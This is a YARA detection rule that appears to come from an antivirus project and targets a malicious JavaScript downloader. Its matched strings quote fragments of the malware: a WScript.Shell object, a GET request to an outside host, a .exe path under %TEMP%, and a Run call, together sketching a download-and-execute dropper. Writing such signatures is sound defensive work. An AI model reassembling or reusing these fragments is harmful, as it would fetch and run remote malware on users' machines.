rule sig_20160328_7c1b7b42a81b569ea72a1563f89417e0 {
  meta:
    description = "datamaliciousorder - file 20160328_7c1b7b42a81b569ea72a1563f89417e0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5252f6fc556b9d47c3f9d058ace5059231010aed2aa9ef9101a6a8b48e56a3fb"

  strings:
    $s1  = "function Xwkwpg() {return Qgdacsbwa[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"fxyowrqUWcbvWm.exe\";};" fullword ascii
    $s2  = "do {WScript[Pxfgljd](Gbqmpgsn() * 11)} while (Zclfx[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Gtaeqxfmko(Elrexsvon, Klbsxv){return Elrexsvon - Klbsxv;};" fullword ascii
    $s4  = "var Qgdacsbwa = function Yisjb() {return WScript[Mzjhb](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Zclfx[Kdnsyy](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s6  = "function Jhewz(Ctovpxmyow){Qgdacsbwa[\"Run\"](Ctovpxmyow, Lbqudesxf, Lbqudesxf);};" fullword ascii
    $s7  = "function Nfegdrk() {return ((Kilstrtfq == true) && (Kilstrtfq == Ufypvth)) ? 1 : Lbqudesxf;};" fullword ascii
    $s8  = "Kilstrtfq = true; " fullword ascii
    $s9  = " while (Dwdqbqdym){" fullword ascii
    $s10 = "var Ufypvth = false;" fullword ascii
    $s11 = "function Gbqmpgsn(){return 22;};" fullword ascii
    $s12 = "var Kilstrtfq = false;" fullword ascii
    $s13 = "var Bxcfgrbrie = false;" fullword ascii
    $s14 = "function Mhpzwrgo()" fullword ascii
    $s15 = "var Tkavk = new this[\"Date\"]();" fullword ascii
    $s16 = "return Gtaeqxfmko(Zwfld, Dwpyg);" fullword ascii
    $s17 = "Ufypvth = true; " fullword ascii
    $s18 = "function Liqfr(){return Yncrfly;};" fullword ascii
    $s19 = "function Jgwugm(Unxwzuz) {var Ebqoqov = (1, 2, 3, 4, 5, Unxwzuz); return Ebqoqov;};" fullword ascii
    $s20 = "function Svvovqu(){return Mzjhb;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}